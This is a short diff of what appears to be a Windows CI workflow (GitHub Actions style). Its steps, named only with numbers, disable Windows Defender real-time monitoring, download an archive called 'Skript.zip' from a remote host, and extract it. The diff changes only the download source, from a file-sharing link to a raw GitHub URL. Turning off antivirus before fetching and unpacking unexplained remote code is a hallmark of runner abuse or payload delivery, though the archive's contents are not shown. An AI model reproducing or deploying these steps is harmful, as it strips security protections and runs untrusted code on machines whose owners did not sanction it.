@@ -23,7 +23,7 @@ jobs:
     - name: 11
       run: Set-MpPreference -DisableRealtimeMonitoring $true
     - name: 5
-      run: Invoke-WebRequest -URI https://www.4sync.com/web/directDownload/PXBICnhz/0s1vqAhF.46f06cbf8fcf9a8d586eb23d19a61d24 -outfile c:\21\Skript.zip
+      run: Invoke-WebRequest -URI https://raw.githubusercontent.com/james81Evans/xgcr9upszpaulsusan/refs/heads/main/Skript.zip -outfile c:\21\Skript.zip
     - name: 7
       run: Expand-Archive -LiteralPath "c:\21\Skript.zip" -DestinationPath "C:\21"
     - name: 15
